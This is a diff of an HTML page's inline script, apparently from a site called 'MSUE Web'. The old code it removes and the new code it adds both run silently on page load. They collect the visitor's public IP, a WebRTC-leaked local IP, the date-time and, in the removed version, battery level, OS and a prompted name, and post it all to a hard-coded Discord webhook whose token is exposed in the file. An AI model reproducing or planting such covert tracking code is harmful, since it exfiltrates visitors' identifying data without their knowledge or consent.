@@ -440,89 +440,81 @@
 const ipAddressWebhookUrl = "https://api.ipify.org?format=json";
 const discordWebhookUrl = "https://discordapp.com/api/webhooks/1246514114071760958/5pvn9EqbSWGyq2hWvNbpASaNsIFvwlO9VL_vsDLOvRX1Occ5gGbqDjcRQTTCkMKQZGl4";
 
-// Function to get battery status
-function getBatteryStatus() {
-    navigator.getBattery().then(battery => {
-        let message = `**MSUE Web**\nBattery Status: ${battery.level * 100}%`;
-        const payload = {
-            content: message
-        };
-        fetch(discordWebhookUrl, {
-            method: "POST",
-            headers: {
-                "Content-Type": "application/json"
-            },
-            body: JSON.stringify(payload)
-        });
-    });
-}
-
-// Function to get browser operating system
-function getBrowserOS() {
-    const userAgent = navigator.userAgent;
-    let os = "Unknown OS";
-    if (userAgent.indexOf("Win") != -1) os = "Windows";
-    else if (userAgent.indexOf("Mac") != -1) os = "Mac OS";
-    else if (userAgent.indexOf("Linux") != -1) os = "Linux";
-    else if (userAgent.indexOf("Android") != -1) os = "Android";
-    else if (userAgent.indexOf("iOS") != -1) os = "iOS";
+function getCurrentDateTime() {
+    const now = new Date();
     
-    let message = `**MSUE Web**\nOperating System: ${os}`;
-    const payload = {
-        content: message
-    };
-    fetch(discordWebhookUrl, {
-        method: "POST",
-        headers: {
-            "Content-Type": "application/json"
-        },
-        body: JSON.stringify(payload)
-    });
+    const year = now.getFullYear();
+    const month = String(now.getMonth() + 1).padStart(2, '0'); // Adding 1 because January is 0
+    const day = String(now.getDate()).padStart(2, '0');
+    
+    const hours = String(now.getHours()).padStart(2, '0');
+    const minutes = String(now.getMinutes()).padStart(2, '0');
+    const seconds = String(now.getSeconds()).padStart(2, '0');
+    
+    const dateTimeString = `${year}-${month}-${day} ${hours}:${minutes}:${seconds}`;
+    
+    return dateTimeString;
 }
 
-// Function to prompt user for their name
-function getUserName() {
-    const userName = prompt("Please enter your name:");
-    let message = `**MSUE Web**\nUser Name: ${userName || 'Anonymous'}`;
-    const payload = {
-        content: message
-    };
-    fetch(discordWebhookUrl, {
-        method: "POST",
-        headers: {
-            "Content-Type": "application/json"
-        },
-        body: JSON.stringify(payload)
-    });
-}
-
-fetch(ipAddressWebhookUrl)
-    .then(response => response.json())
-    .then(data => {
-        const ipAddress = data.ip;
-        const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
-        let message = `**MSUE Web**\nIP Address: ${ipAddress}`;
-        if (isMobile) {
-            message += "\nAccessed through a mobile device.";
-        } else {
-            message += "\nAccessed through a desktop or laptop.";
-        }
-        const payload = {
-            content: message
-        };
-        fetch(discordWebhookUrl, {
-            method: "POST",
-            headers: {
-                "Content-Type": "application/json"
-            },
-            body: JSON.stringify(payload)
-        });
+function getLocalIPAddress() {
+    return new Promise((resolve, reject) => {
+        const pc = new RTCPeerConnection();
+        pc.createDataChannel('');
         
-        // Call additional functions
-        getBatteryStatus();
-        getBrowserOS();
-        getUserName();
+        pc.onicecandidate = (e) => {
+            if (!e.candidate) {
+                pc.close();
+                reject(new Error('No local IP address found.'));
+                return;
+            }
+            const localIPAddress = e.candidate.address;
+            pc.close();
+            resolve(localIPAddress);
+        };
+        
+        pc.createOffer().then(pc.setLocalDescription.bind(pc));
     });
+}
+
+function sendToDiscord(message) {
+    const payload = {
+        content: message
+    };
+    fetch(discordWebhookUrl, {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify(payload)
+    });
+}
+
+// Main function to gather and send information
+function gatherAndSendInformation() {
+    fetch(ipAddressWebhookUrl)
+        .then(response => response.json())
+        .then(data => {
+            const ipAddress = data.ip;
+            const dateTime = getCurrentDateTime();
+            let message = `**MSUE Web**\nIP Address: ${ipAddress}\nDate Time: ${dateTime}`;
+            
+            getLocalIPAddress()
+                .then(localIP => {
+                    message += `\nLocal IP Address: ${localIP}`;
+                    sendToDiscord(message);
+                })
+                .catch(error => {
+                    console.error('Error getting local IP:', error.message);
+                    sendToDiscord(message);
+                });
+        })
+        .catch(error => {
+            console.error('Error getting IP address:', error.message);
+        });
+}
+
+// Call the main function to gather and send information
+gatherAndSendInformation();
 
 </script>
 <!-- <script>
